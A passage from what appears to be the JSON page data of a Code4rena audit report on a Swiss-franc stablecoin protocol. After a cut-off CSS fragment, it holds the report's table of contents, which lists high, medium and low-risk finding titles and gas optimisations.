var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-6\">High Risk Findings (6)</a></p>\n<ul>\n<li><a href=\"#h-01-challenges-can-be-frontrun-with-de-leveraging-to-cause-lossses-for-challengers\">[H-01] Challenges can be frontrun with de-leveraging to cause lossses for challengers</a></li>\n<li><a href=\"#h-02-double-entrypoint-collateral-token-allows-position-owner-to-withdraw-underlying-collateral-without-repaying-zchf\">[H-02] Double-entrypoint collateral token allows position owner to withdraw underlying collateral without repaying ZCHF</a></li>\n<li><a href=\"#h-03-when-the-challenge-is-successful-the-user-can-send-tokens-to-the-position-to-avoid-the-positions-cooldown-period-being-extended\">[H-03] When the challenge is successful, the user can send tokens to the position to avoid the position’s cooldown period being extended</a></li>\n<li><a href=\"#h-04-transfer-position-ownership-to-addr0-to-dos-end-challenge\">[H-04] Transfer position ownership to <code>addr(0)</code> to DoS <code>end()</code> challenge</a></li>\n<li><a href=\"#h-05-position-owners-can-deny-liquidations\">[H-05] Position owners can deny liquidations</a></li>\n<li><a href=\"#h-06-challenger_reward-can-be-used-to-drain-reserves-and-free-mint\">[H-06] <code>CHALLENGER_REWARD</code> can be used to drain reserves and free mint</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-15\">Medium Risk Findings (15)</a></p>\n<ul>\n<li><a href=\"#m-01-function-restructurecaptable-in-equitysol-not-functioning-as-expected-\">[M-01] Function <code>restructureCapTable()</code> in <code>Equity.sol</code> not functioning as expected </a></li>\n<li><a href=\"#m-02-position-limit-could-be-fully-reduced-to-zero-by-clones\">[M-02] POSITION LIMIT COULD BE FULLY REDUCED TO ZERO BY CLONES</a></li>\n<li><a href=\"#m-03-manipulation-of-total-share-amount-might-cause-future-depositors-to-lose-their-assets\">[M-03] Manipulation of total share amount might cause future depositors to lose their assets</a></li>\n<li><a href=\"#m-04-anchortime-will-not-work-properly-on-optimism-due-to-use-of-blocknumber\">[M-04] <code>anchorTime()</code> will not work properly on Optimism due to use of <code>block.number</code></a></li>\n<li><a href=\"#m-05-owner-of-denied-position-is-not-able-to-withdraw-collateral-until-expiry\">[M-05] Owner of Denied Position is not able to withdraw collateral until expiry</a></li>\n<li><a href=\"#m-06-challengers-and-bidders-can-collude-together-to-restrict-the-minting-of-position-owner\">[M-06] Challengers and bidders can collude together to restrict the minting of position owner</a></li>\n<li><a href=\"#m-07-need-alternative-ways-for-fund-transfer-in-end-to-prevent-dos\">[M-07] Need alternative ways for fund transfer in <code>end()</code> to prevent DoS</a></li>\n<li><a href=\"#m-08-initializeclone-price-calculation-should-round-up\">[M-08] <code>initializeClone()</code> price calculation should round up</a></li>\n<li><a href=\"#m-09-unable-to-adjust-position-in-some-cases\">[M-09] Unable to adjust position in some cases</a></li>\n<li><a href=\"#m-10-no-slippage-control-when-minting-and-redeeming-fps\">[M-10] No slippage control when minting and redeeming FPS</a></li>\n<li><a href=\"#m-11-later-challengers-can-bid-on-the-previous-challenge-to-extend-the-expiration-time-of-the-previous-challenge-so-that-their-own-challenge-can-succeed-before-the-previous-challenge-and-get-challenge-rewards\">[M-11] Later challengers can bid on the previous challenge to extend the expiration time of the previous challenge, so that their own challenge can succeed before the previous challenge and get challenge rewards</a></li>\n<li><a href=\"#m-12-auctions-fail-to-account-for-network-and-market-conditions\">[M-12] Auctions fail to account for network and market conditions</a></li>\n<li><a href=\"#m-13-cant-pause-or-remove-a-minter\">[M-13] Can’t pause or remove a minter</a></li>\n<li><a href=\"#m-14-re-org-attack-in-factory\">[M-14] Re-org attack in factory</a></li>\n<li><a href=\"#m-15-notifyloss-can-be-frontrun-by-redeem\">[M-15] <code>notifyLoss</code> can be frontrun by redeem</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#low-issues\">Low Issues</a></li>\n<li><a href=\"#l-01-frontrunning-suggestminter-may-lead-to-stolen-funds\">L-01 Frontrunning suggestMinter may lead to stolen funds</a></li>\n<li><a href=\"#l-02-not-validating-min_application_period-can-lead-to-stolen-funds\">L-02 Not validating <code>MIN_APPLICATION_PERIOD</code> can lead to stolen funds</a></li>\n<li><a href=\"#l-03-min_holding_duration-will-not-hold-a-correct-value-if-deployed-on-other-network\">L-03 <code>MIN_HOLDING_DURATION</code> will not hold a correct value if deployed on other network</a></li>\n<li><a href=\"#l-04-positions-should-be-expired-when-blocktimestamp--expiration\">L-04 Positions should be expired when <code>block.timestamp = expiration</code></a></li>\n<li><a href=\"#l-05-no-pause-mechanism-in-case-of-depeg-of-xchf-token\">L-05 No pause mechanism in case of depeg of XCHF token</a></li>\n<li><a href=\"#l-06-tokens-with-very-large-decimals-will-not-work-as-expected\">L-06 Tokens with very large decimals will not work as expected</a></li>\n<li><a href=\"#l-07-minbid-can-be-bypassed-to-bid-indefinitely-for-small-amounts\">L-07 minBid can be bypassed to bid indefinitely for small amounts</a></li>\n<li><a href=\"#l-08-erc-777-tokens-can-lead-to-re-entrancy-vulnerabilities\">L-08 ERC-777 tokens can lead to re-entrancy vulnerabilities</a></li>\n<li><a href=\"#l-09-challenges-can-be-split-after-they-end\">L-09 Challenges can be split after they end</a></li>\n<li><a href=\"#non-critical-issues\">Non-Critical Issues</a></li>\n<li><a href=\"#n-01-no-way-to-track-challenges-created-by-a-user\">N-01 No way to track challenges created by a user</a></li>\n<li><a href=\"#n-02-equity-tokens-sent-to-oneself-are-processed-to-update-votes\">N-02 Equity tokens sent to oneself are processed to update votes</a></li>\n<li><a href=\"#n-03-misleading-comment-about-position-start-value\">N-03 Misleading comment about position <code>start</code> value</a></li>\n<li><a href=\"#n-04-rebasing-tokens-can-lead-to-bad-accountability-of-the-positions\">N-04 Rebasing tokens can lead to bad accountability of the positions</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#notes\">Notes</a></li>\n<li><a href=\"#g-01--ifsrequire-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\">G-01  IF’s/require() statements that check input arguments should be at the top of the function</a></li>\n<li><a href=\"#g-02-the-result-of-a-function-call-should-be-cached-rather-than-re-calling-the-function\">G-02 The result of a function call should be cached rather than re-calling the function</a></li>\n<li><a href=\"#g-03-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\">G-03 Multiple accesses of a mapping/array should use a local variable cache</a></li>\n<li><a href=\"#g-04-using-unchecked-blocks-to-save-gas\">G-04 Using unchecked blocks to save gas</a></li>\n<li><a href=\"#g-05-2n-should-be-re-written-as-typeuintnmax\">G-05 <code>2**&#x3C;n></code> should be re-written as <code>type(uint&#x3C;n>).max</code></a></li>\n<li><a href=\"#g-06-unnecessary-casting-as-variable-is-already-of-the-same-type\">G-06 Unnecessary casting as variable is already of the same type</a></li>\n<li><a href=\"#note-the-following-have-some-caveats-we-can-reduce-the-deployment-size-and-deployment-cost-at-the-expense-of-execution-cost\">Note: The following have some caveats, we can reduce the deployment size and deployment cost at the expense of execution cost</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}